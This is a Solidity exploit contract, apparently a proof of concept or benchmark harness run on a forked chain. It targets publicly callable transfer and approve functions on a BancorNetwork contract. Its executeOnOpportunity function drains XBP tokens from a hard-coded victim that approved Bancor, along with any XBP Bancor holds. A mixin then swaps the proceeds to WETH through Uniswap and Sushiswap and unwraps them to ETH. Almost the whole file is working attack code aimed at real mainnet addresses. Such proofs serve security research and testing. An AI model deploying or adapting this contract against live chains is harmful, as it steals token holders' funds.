// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}

interface IBancorNetworkVuln {
    function safeApprove(address token, address spender, uint256 value) external;
    function safeTransfer(address token, address to, uint256 value) external;
    function safeTransferFrom(address token, address from, address to, uint256 value) external;
}


abstract contract __AHTokenToEthMixin {
    address internal constant AH_WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant AH_UNI_V2 = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address internal constant AH_SUSHI = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;

    function _ahFinalizeTokenToEth() internal {
        address token = _ahReadProfitToken();
        if (token == address(0)) return;

        if (token == AH_WETH) {
            _ahTryUnwrapWeth();
            return;
        }

        uint256 bal = _ahBalanceOf(token, address(this));
        if (bal == 0) return;

        _ahTryApprove(token, AH_UNI_V2, bal);
        _ahTrySwapTokenToWeth(token, AH_UNI_V2, bal);

        bal = _ahBalanceOf(token, address(this));
        if (bal > 0) {
            _ahTryApprove(token, AH_SUSHI, bal);
            _ahTrySwapTokenToWeth(token, AH_SUSHI, bal);
        }

        _ahTryUnwrapWeth();
    }

    function _ahReadProfitToken() internal view returns (address token) {
        (bool ok, bytes memory ret) = address(this).staticcall(abi.encodeWithSignature("profitToken()"));
        if (!ok || ret.length < 32) return address(0);
        token = abi.decode(ret, (address));
    }

    function _ahBalanceOf(address token, address account) internal view returns (uint256 bal) {
        if (token == address(0)) return 0;
        (bool ok, bytes memory ret) = token.staticcall(abi.encodeWithSelector(IAHERC20.balanceOf.selector, account));
        if (!ok || ret.length < 32) return 0;
        bal = abi.decode(ret, (uint256));
    }

    function _ahTryApprove(address token, address spender, uint256 amount) internal {
        (bool ok,) = token.call(abi.encodeWithSelector(IAHERC20.approve.selector, spender, 0));
        ok;
        (ok,) = token.call(abi.encodeWithSelector(IAHERC20.approve.selector, spender, amount));
        ok;
    }

    function _ahTrySwapTokenToWeth(address token, address router, uint256 amountIn) internal {
        if (amountIn == 0) return;
        address[] memory path = new address[](2);
        path[0] = token;
        path[1] = AH_WETH;
        (bool ok,) = router.call(
            abi.encodeWithSelector(
                IAHUniV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens.selector,
                amountIn,
                0,
                path,
                address(this),
                block.timestamp
            )
        );
        ok;
    }

    function _ahTryUnwrapWeth() internal {
        uint256 wethBal = _ahBalanceOf(AH_WETH, address(this));
        if (wethBal == 0) return;
        (bool ok,) = AH_WETH.call(abi.encodeWithSelector(IAHWETH.withdraw.selector, wethBal));
        ok;
    }
}


contract FlawVerifier is __AHTokenToEthMixin {
    address internal constant BANCOR_NETWORK = 0x5f58058C0eC971492166763c8C22632B583F667f;
    address internal constant XBP = 0x28dee01D53FED0Edf5f6E310BF8Ef9311513Ae40;
    address internal constant VICTIM = 0xfd0B4DAa7bA535741E6B5Ba28Cba24F9a816E67E;

    IBancorNetworkVuln internal constant bancor = IBancorNetworkVuln(BANCOR_NETWORK);
    IERC20Like internal constant token = IERC20Like(XBP);

    bool public executed;

    constructor() {}

    function executeOnOpportunity() public {
        if (executed) {
            return;
        }
        executed = true;

        // Exploit path 1:
        // BancorNetwork.safeTransferFrom(token, victim, attacker, amount)
        // is publicly reachable, so any caller can pull from a victim that approved Bancor.
        uint256 approvedToBancor = token.allowance(VICTIM, BANCOR_NETWORK);
        uint256 victimBalance = token.balanceOf(VICTIM);
        uint256 drainableFromVictim = _min(approvedToBancor, victimBalance);
        if (drainableFromVictim > 0) {
            bancor.safeTransferFrom(XBP, VICTIM, address(this), drainableFromVictim);
        }

        // Exploit path 2:
        // BancorNetwork.safeTransfer(token, attacker, amount) is also public.
        // This stage is only feasible if BancorNetwork already holds XBP at the fork state.
        uint256 bancorBalance = token.balanceOf(BANCOR_NETWORK);
        if (bancorBalance > 0) {
            bancor.safeTransfer(XBP, address(this), bancorBalance);
        }

        // Exploit path 3:
        // BancorNetwork.safeApprove(token, attacker, allowance) can grant this verifier
        // allowance over BancorNetwork-held XBP, followed by ERC20.transferFrom.
        // If BancorNetwork holds no remaining XBP at runtime, this stage is mechanically
        // infeasible for XBP on this fork and is therefore skipped.
        uint256 remainingBancorBalance = token.balanceOf(BANCOR_NETWORK);
        if (remainingBancorBalance > 0) {
            bancor.safeApprove(XBP, address(this), remainingBancorBalance);
            token.transferFrom(BANCOR_NETWORK, address(this), remainingBancorBalance);
        }
        _ahFinalizeTokenToEth();
    }

    function profitToken() external pure returns (address) {
        return XBP;
    }

    function profitAmount() external view returns (uint256) {
        return token.balanceOf(address(this));
    }

    function _min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }
}

interface IAHERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IAHWETH {
    function withdraw(uint256 amount) external;
}

interface IAHUniV2Router {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}
